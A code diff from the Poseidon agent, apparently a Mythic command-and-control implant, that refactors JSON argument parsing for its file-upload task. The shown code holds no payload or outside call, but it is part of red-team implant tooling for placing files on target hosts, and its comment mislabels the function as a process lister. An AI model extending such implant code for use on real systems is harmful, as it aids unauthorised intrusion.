@@ -12,19 +12,34 @@ import (
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
 )
 
-type uploadArgs struct {
-	FileID     string `json:"file_id"`
-	RemotePath string `json:"remote_path"`
-	Overwrite  bool   `json:"overwrite"`
+type Arguments struct {
+	FileID     string
+	RemotePath string
+	Overwrite  bool
+}
+
+func (e *Arguments) UnmarshalJSON(data []byte) error {
+	alias := map[string]interface{}{}
+	err := json.Unmarshal(data, &alias)
+	if err != nil {
+		return err
+	}
+	if v, ok := alias["file_id"]; ok {
+		e.FileID = v.(string)
+	}
+	if v, ok := alias["remote_path"]; ok {
+		e.RemotePath = v.(string)
+	}
+	if v, ok := alias["overwrite"]; ok {
+		e.Overwrite = v.(bool)
+	}
+	return nil
 }
 
 // Run - interface method that retrieves a process list
 func Run(task structs.Task) {
 	msg := task.NewResponse()
-
-	// File upload
-	args := uploadArgs{}
-
+	args := Arguments{}
 	err := json.Unmarshal([]byte(task.Params), &args)
 	if err != nil {
 		msg.SetError(fmt.Sprintf("Failed to unmarshal parameters: %s", err.Error()))
